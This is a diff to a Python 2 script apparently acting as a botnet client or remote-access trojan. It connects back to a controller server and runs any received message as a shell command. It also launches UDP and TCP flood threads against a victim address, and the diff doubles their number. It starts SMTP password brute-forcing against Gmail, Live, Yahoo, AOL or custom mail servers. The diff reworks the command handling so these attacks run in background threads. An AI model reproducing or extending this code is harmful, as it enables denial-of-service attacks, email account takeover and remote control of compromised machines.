@@ -10,12 +10,15 @@ if (len(sys.argv) == 3):
 else:
 	sys.exit("Usage: client.py <server ip> <server port>")
 
+#Used to make sure a subprocess lasts 30 seconds max-->
 class Alarm(Exception):
     pass
 
 def alarm_handler(signum, frame):
     raise Alarm
+#<--
 
+#Used by the Bruteforcer-->
 def product(*args, **kwds):
     pools = map(tuple, args) * kwds.get('repeat', 1)
     result = [[]]
@@ -31,6 +34,7 @@ def repeat(object, times=None):
     else:
         for i in xrange(times):
             yield object
+#<--
 
 def savePass(password):
 	f = open("password.txt", "w")
@@ -116,7 +120,7 @@ class tcpFlood(threading.Thread):
 
 def udpUnleach(victimip, victimport):
 	threads = []
-	for i in range(1, 11):
+	for i in range(1, 21):
     		thread = udpFlood(victimip, victimport)
     		thread.start()
    		threads.append(thread)
@@ -126,7 +130,7 @@ def udpUnleach(victimip, victimport):
 
 def tcpUnleach(victimip, victimport):
 	threads = []
-	for i in range(1, 11):
+	for i in range(1, 21):
     		thread = tcpFlood(victimip, victimport)
     		thread.start()
    		threads.append(thread)
@@ -134,22 +138,114 @@ def tcpUnleach(victimip, victimport):
 	for thread in threads:
     		thread.join()
 
-def main():
-	global host, port
+def main(host, port):
 	while 1:
-		s=socket(AF_INET, SOCK_STREAM)
+		connected = False
 		while 1:
+			while (connected == False):
+				try:
+					s=socket(AF_INET, SOCK_STREAM)
+					s.connect((host,port))
+					print "[INFO] Connected"
+					connected = True
+				except:
+					time.sleep(5)
+
 			try:
-				s.connect((host,port))
-				print "[INFO] Connected"
-				break
-			except:
-				time.sleep(5)
-		
-		while 1:
-			try:
-				msg=s.recv(10240)
-				if ((msg != "exit") and ("cd " not in msg) and ("udpflood " not in msg) and ("tcpflood " not in msg) and (msg != "hellows123") and ("udpfloodall " not in msg) and ("tcpfloodall " not in msg) and ("gmailbruteforce" not in msg) and ("livebruteforce" not in msg) and ("yahoobruteforce" not in msg) and ("aolbruteforce" not in msg) and ("custombruteforce" not in msg)):
+				msg=s.recv(20480)
+				if ("cd " in msg):
+					msg = msg.replace("cd ","")
+					os.chdir(msg)
+					s.send(os.getcwd())
+					print "[INFO] Changed dir to %s" % os.getcwd()
+				elif ("udpflood " in msg):
+					msg = msg.replace("udpflood ", "")
+					seperator = msg.index(":")
+					try:
+						t = Thread(None,udpUnleach,None,(msg[:seperator], msg[seperator+1:]))
+        					t.start()
+						s.send("[CLIENT] Flooding started\n")
+					except:
+						s.send("[CLIENT] Failed to start Flooding\n")
+						pass
+				elif ("udpfloodall " in msg):
+					msg = msg.replace("udpfloodall ", "")
+					seperator = msg.index(":")
+					try:
+						t = Thread(None,udpUnleach,None,(msg[:seperator], msg[seperator+1:]))
+        					t.start()
+					except:
+						pass
+				elif ("tcpflood " in msg):
+					msg = msg.replace("tcpflood ", "")
+					seperator = msg.index(":")
+					try:
+						t = Thread(None,tcpUnleach,None,(msg[:seperator], msg[seperator+1:]))
+        					t.start()
+						s.send("[INFO] Flooding started\n")
+					except:
+						s.send("[ERROR] Failed to start Flooding\n")
+						pass
+				elif ("tcpfloodall " in msg):
+					msg = msg.replace("tcpfloodall ", "")
+					seperator = msg.index(":")
+					try:
+						t = Thread(None,tcpUnleach,None,(msg[:seperator], msg[seperator+1:]))
+        					t.start()
+					except:
+						pass
+				elif ("gmailbruteforce " in msg):
+					msg = msg.replace("gmailbruteforce ", "")
+					try:
+						email, combination, minimum, maximum = msg.split(":")
+						t = Thread(None,gmailbruteforce,None,(email, combination, minimum, maximum))
+        					t.start()
+						s.send("[CLIENT] Bruteforcing started\n")
+					except:
+						s.send("[CLIENT] Wrong arguments\n")
+				elif ("livebruteforce " in msg):
+					msg = msg.replace("livebruteforce ", "")
+					try:
+						email, combination, minimum, maximum = msg.split(":")
+						t = Thread(None,custombruteforce,None,("smtp.live.com", 587, email, combination, minimum, maximum))
+        					t.start()
+						s.send("[CLIENT] Bruteforcing started\n")				
+					except:
+						s.send("[CLIENT] Wrong arguments\n")
+				elif ("yahoobruteforce " in msg):
+					msg = msg.replace("yahoobruteforce ", "")
+					try:
+						email, combination, minimum, maximum = msg.split(":")
+						t = Thread(None,custombruteforce,None,("smtp.mail.yahoo.com", 587, email, combination, minimum, maximum))
+        					t.start()
+						s.send("[CLIENT] Bruteforcing started\n")				
+					except:
+						s.send("[CLIENT] Wrong arguments\n")
+				elif ("aolbruteforce " in msg):
+					msg = msg.replace("aolbruteforce ", "")
+					try:
+						email, combination, minimum, maximum = msg.split(":")
+						t = Thread(None,custombruteforce,None,("smtp.aol.com", 587, email, combination, minimum, maximum))
+        					t.start()
+						s.send("[CLIENT] Bruteforcing started\n")				
+					except:
+						s.send("[CLIENT] Wrong arguments\n")
+				elif ("custombruteforce " in msg):
+					msg = msg.replace("custombruteforce ", "")
+					try:
+						address, port, email, combination, minimum, maximum = msg.split(":")
+						t = Thread(None,custombruteforce,None,(address, port, email, combination, minimum, maximum))
+        					t.start()
+						s.send("[CLIENT] Bruteforcing started\n")				
+					except:
+						s.send("[CLIENT] Wrong arguments\n")
+				elif (msg == "hellows123"):
+					s.send(os.getcwd())
+				elif (msg == "quit"):
+					s.close()
+					print "[INFO] Connection Closed"
+					break
+				else:
 					comm = subprocess.Popen(str(msg), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 					signal.signal(signal.SIGALRM, alarm_handler)
 					signal.alarm(30)
@@ -171,101 +267,17 @@ def main():
 						comm.kill()
     						s.send("[CLIENT] 30 Seconds Exceeded - SubProcess Killed\n")				
 					signal.alarm(0)
-				elif ("cd " in msg):
-					msg = msg.replace("cd ","")
-					os.chdir(msg)
-					s.send(os.getcwd())
-					print "[INFO] Changed dir to %s" % os.getcwd()
-				elif ("udpflood " in msg):
-					msg = msg.replace("udpflood ", "")
-					seperator = msg.index(":")
-					try:
-						udpUnleach(msg[:seperator],msg[seperator+1:])
-					except:
-						pass
-				elif ("udpfloodall " in msg):
-					msg = msg.replace("udpfloodall ", "")
-					seperator = msg.index(":")
-					try:
-						udpUnleach(msg[:seperator],msg[seperator+1:])
-					except:
-						pass
-				elif ("tcpflood " in msg):
-					msg = msg.replace("tcpflood ", "")
-					seperator = msg.index(":")
-					try:
-						tcpUnleach(msg[:seperator],msg[seperator+1:])
-					except:
-						pass
-				elif ("tcpfloodall " in msg):
-					msg = msg.replace("tcpfloodall ", "")
-					seperator = msg.index(":")
-					try:
-						tcpUnleach(msg[:seperator],msg[seperator+1:])
-					except:
-						pass
-				elif ("gmailbruteforce " in msg):
-					msg = msg.replace("gmailbruteforce ", "")
-					try:
-						email, combination, minimum, maximum = msg.split(":")
-						t = Thread(None,gmailbruteforce,None,(email, combination, minimum, maximum))
-        					t.start()
-						s.send("[INFO] Bruteforcing started\n")				
-					except:
-						s.send("[ERROR] Wrong arguments\n")
-				elif ("livebruteforce " in msg):
-					msg = msg.replace("livebruteforce ", "")
-					try:
-						email, combination, minimum, maximum = msg.split(":")
-						t = Thread(None,custombruteforce,None,("smtp.live.com", 587, email, combination, minimum, maximum))
-        					t.start()
-						s.send("[INFO] Bruteforcing started\n")				
-					except:
-						s.send("[ERROR] Wrong arguments\n")
-				elif ("yahoobruteforce " in msg):
-					msg = msg.replace("yahoobruteforce ", "")
-					try:
-						email, combination, minimum, maximum = msg.split(":")
-						t = Thread(None,custombruteforce,None,("smtp.mail.yahoo.com", 587, email, combination, minimum, maximum))
-        					t.start()
-						s.send("[INFO] Bruteforcing started\n")				
-					except:
-						s.send("[ERROR] Wrong arguments\n")
-				elif ("aolbruteforce " in msg):
-					msg = msg.replace("aolbruteforce ", "")
-					try:
-						email, combination, minimum, maximum = msg.split(":")
-						t = Thread(None,custombruteforce,None,("smtp.aol.com", 587, email, combination, minimum, maximum))
-        					t.start()
-						s.send("[INFO] Bruteforcing started\n")				
-					except:
-						s.send("[ERROR] Wrong arguments\n")
-				elif ("custombruteforce " in msg):
-					msg = msg.replace("custombruteforce ", "")
-					try:
-						address, port, email, combination, minimum, maximum = msg.split(":")
-						t = Thread(None,custombruteforce,None,(address, port, email, combination, minimum, maximum))
-        					t.start()
-						s.send("[INFO] Bruteforcing started\n")				
-					except:
-						s.send("[ERROR] Wrong arguments\n")
-				elif (msg == "hellows123"):
-					s.send(os.getcwd())
-				else:
-					print "[INFO] Connection Closed"
-					s.close()
-					break
 			except KeyboardInterrupt:
-				print "[INFO] Connection Closed"
 				s.close()
+				print "[INFO] Connection Closed"
 				break
 			except:
-				print "[INFO] Connection Closed"
 				s.close()
+				print "[INFO] Connection Closed"
 				break
 			
 while 1:
 	try:
-		main()
+		main(host, port)
 	except:
 		time.sleep(5)
